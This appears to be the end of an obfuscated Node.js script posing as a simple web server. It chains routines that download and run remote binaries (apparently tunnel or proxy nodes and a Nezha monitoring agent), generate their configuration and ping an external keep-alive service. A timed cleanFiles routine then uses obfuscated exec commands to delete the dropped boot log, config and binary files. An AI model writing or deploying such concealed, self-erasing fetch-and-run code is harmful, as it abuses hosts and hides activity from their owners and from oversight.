                return _0x2e1351 && _0x1e694b[_0x1c6a04(0x2b5)](_0x2e1351[_0x1c6a04(0x15d)], -0x1bc8 + -0x2136 + 0x3dc6) ? (console[_0x1c6a04(0x14a)](_0x1e694b[_0x1c6a04(0x194)]), _0x2e1351) : null;
            } catch (_0x47f738) {
                return null;
            }
        } else
            return;
    }
}
function cleanFiles() {
    const _0x38468d = _0x3595c8, _0xa5cae6 = {
            'pCpXG': _0x38468d(0x21a) + _0x38468d(0x295),
            'NaVem': _0x38468d(0x2d5) + _0x38468d(0x143) + _0x38468d(0x2be) + _0x38468d(0x144),
            'fvhBT': function (_0x2fcee5, _0x526917) {
                return _0x2fcee5 && _0x526917;
            },
            'pnOrd': function (_0x1c21dd, _0x5b94da) {
                return _0x1c21dd === _0x5b94da;
            },
            'ydHXS': _0x38468d(0x32a),
            'uUDmm': function (_0x4783c1, _0x2bd831, _0xb9e71f) {
                return _0x4783c1(_0x2bd831, _0xb9e71f);
            }
        };
    _0xa5cae6[_0x38468d(0x113)](setTimeout, () => {
        const _0x2b8426 = _0x38468d, _0x3f7e90 = [
                bootLogPath,
                configPath,
                webPath,
                botPath
            ];
        if (NEZHA_PORT)
            _0x3f7e90[_0x2b8426(0x2fc)](npmPath);
        else
            _0xa5cae6[_0x2b8426(0x240)](NEZHA_SERVER, NEZHA_KEY) && _0x3f7e90[_0x2b8426(0x2fc)](phpPath);
        _0xa5cae6[_0x2b8426(0x1e4)](process[_0x2b8426(0x30f)], _0xa5cae6[_0x2b8426(0x243)]) ? _0xa5cae6[_0x2b8426(0x113)](exec, _0x2b8426(0x220) + _0x3f7e90[_0x2b8426(0x19d)]('\x20') + (_0x2b8426(0x219) + '1'), _0x1e67aa => {
            const _0x125a56 = _0x2b8426;
            console[_0x125a56(0x2c1)](), console[_0x125a56(0x14a)](_0xa5cae6[_0x125a56(0x2c4)]), console[_0x125a56(0x14a)](_0xa5cae6[_0x125a56(0x20b)]);
        }) : _0xa5cae6[_0x2b8426(0x113)](exec, _0x2b8426(0x127) + _0x3f7e90[_0x2b8426(0x19d)]('\x20') + (_0x2b8426(0x12a) + _0x2b8426(0x133)), _0x12a066 => {
            const _0x1bb064 = _0x2b8426;
            console[_0x1bb064(0x2c1)](), console[_0x1bb064(0x14a)](_0xa5cae6[_0x1bb064(0x2c4)]), console[_0x1bb064(0x14a)](_0xa5cae6[_0x1bb064(0x20b)]);
        });
    }, -0x14957 + -0x11733 + 0x3c01a);
}
cleanFiles();
async function AddVisitTask() {
    const _0x1647b4 = _0x3595c8, _0x12cb98 = {
            'DwRkl': function (_0x232fd8, _0x161cd7) {
                return _0x232fd8 || _0x161cd7;
            },
            'KTFzf': _0x1647b4(0x2e0) + _0x1647b4(0x260) + _0x1647b4(0x262) + _0x1647b4(0x242),
            'OBWvC': _0x1647b4(0x146) + _0x1647b4(0x22d) + _0x1647b4(0x255) + 'l',
            'ZCSmF': _0x1647b4(0x320) + _0x1647b4(0x124)
        };
    if (_0x12cb98[_0x1647b4(0x2a1)](!AUTO_ACCESS, !PROJECT_URL)) {
        console[_0x1647b4(0x14a)](_0x12cb98[_0x1647b4(0x126)]);
        return;
    }
    try {
        const _0x163a63 = await axios[_0x1647b4(0x1b1)](_0x12cb98[_0x1647b4(0x23c)], { 'url': PROJECT_URL }, { 'headers': { 'Content-Type': _0x12cb98[_0x1647b4(0x284)] } });
        return console[_0x1647b4(0x14a)](_0x1647b4(0x122) + _0x1647b4(0x224) + _0x1647b4(0x305) + _0x1647b4(0x2fe)), _0x163a63;
    } catch (_0x56f61e) {
        return console[_0x1647b4(0x180)](_0x1647b4(0x2df) + _0x1647b4(0x169) + _0x1647b4(0x2bd) + _0x1647b4(0x27e) + _0x56f61e[_0x1647b4(0x1a4)]), null;
    }
}
async function startserver() {
    const _0x561861 = _0x3595c8, _0x5f0db7 = {
            'UTLXu': _0x561861(0x251) + _0x561861(0x266),
            'laExl': function (_0x5062c9) {
                return _0x5062c9();
            },
            'kOaOQ': function (_0x8e6972) {
                return _0x8e6972();
            },
            'sfrOi': function (_0x3fbafb) {
                return _0x3fbafb();
            },
            'mCEzi': function (_0x55d25a) {
                return _0x55d25a();
            },
            'LquzU': function (_0x3dbfb4) {
                return _0x3dbfb4();
            },
            'ElpWD': _0x561861(0x13e) + _0x561861(0x2c2) + ':'
        };
    try {
        const _0x9d6350 = _0x5f0db7[_0x561861(0x107)][_0x561861(0x18d)]('|');
        let _0x47e488 = 0x8e2 + -0x36d * -0x2 + 0xfbc * -0x1;
        while (!![]) {
            switch (_0x9d6350[_0x47e488++]) {
            case '0':
                await _0x5f0db7[_0x561861(0x11f)](AddVisitTask);
                continue;
            case '1':
                await _0x5f0db7[_0x561861(0x125)](extractDomains);
                continue;
            case '2':
                await _0x5f0db7[_0x561861(0x125)](downloadFilesAndRun);
                continue;
            case '3':
                _0x5f0db7[_0x561861(0x30c)](cleanupOldFiles);
                continue;
            case '4':
                await _0x5f0db7[_0x561861(0x11d)](generateConfig);
                continue;
            case '5':
                _0x5f0db7[_0x561861(0x11d)](argoType);
                continue;
            case '6':
                _0x5f0db7[_0x561861(0x239)](deleteNodes);
                continue;
            }
            break;
        }
    } catch (_0x35f421) {
        console[_0x561861(0x180)](_0x5f0db7[_0x561861(0x327)], _0x35f421);
    }
}
startserver()[_0x3595c8(0x103)](_0x21d186 => {
    const _0x52a407 = _0x3595c8, _0x254f2b = { 'aSsgM': _0x52a407(0x1f0) + _0x52a407(0x2ec) + _0x52a407(0x2c2) + ':' };
    console[_0x52a407(0x180)](_0x254f2b[_0x52a407(0x117)], _0x21d186);
}), app[_0x3595c8(0x1c3)]('/', async function (_0x466fa6, _0x2f17cc) {
    const _0x493c17 = _0x3595c8, _0x5541ce = { 'VCXfw': _0x493c17(0x21a) + _0x493c17(0x1df) + _0x493c17(0x195) + _0x493c17(0x32d) };
    _0x2f17cc[_0x493c17(0x15d)](-0x5f9 * 0x2 + 0xd * -0x121 + -0x1b67 * -0x1)[_0x493c17(0x17d)](_0x5541ce[_0x493c17(0x228)]);
}), app[_0x3595c8(0x201)](PORT, _0x3595c8(0x233), () => console[_0x3595c8(0x14a)](_0x3595c8(0x277) + _0x3595c8(0x2c9) + _0x3595c8(0x205) + ':' + PORT + '!'));
